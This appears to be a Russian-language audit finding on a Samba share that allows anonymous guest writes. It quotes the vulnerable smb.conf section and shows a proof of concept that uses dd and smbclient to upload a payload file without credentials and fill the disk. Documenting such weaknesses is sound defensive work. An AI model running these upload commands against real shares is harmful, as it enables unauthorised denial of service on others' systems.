Конфигурационный недостаток, заключающийся в одновременной активации директив анонимного доступа и прав на запись
При отсутствии настроенных механизмов ограничения дискового пространства, данная конфигурация открывает вектор для проведения атак изчерпания дискового пространства
Неавторизованный нарушитель имеет возможность бесконтрольно и анонимно загружать файлы произвольного объема в общую папку

В конфигурационном файле /etc/samba/smb.conf параметры глобальной секции и целевого сетевого ресурса разрешают сопоставление неизвестных учетных записей с гостевой сессией на запись:
[global]
map to guest = Bad User

[PublicShare]
path = /home/vsftpd/smb_share
browsable = yes
writable = yes
guest ok = yes


Для демонстрации возможности анонимного заполнения пространства диска можно создать массив данных с помощью утилиты dd:
dd if=/dev/zero of=DoS_payload.img bs=1M count=50
Используя пустой контекст учетных данных, атакующий загружает сформированный нагрузочный файл в целевую директорию:
smbclient //192.168.1.21/PublicShare -N -c "put DoS_payload.img"
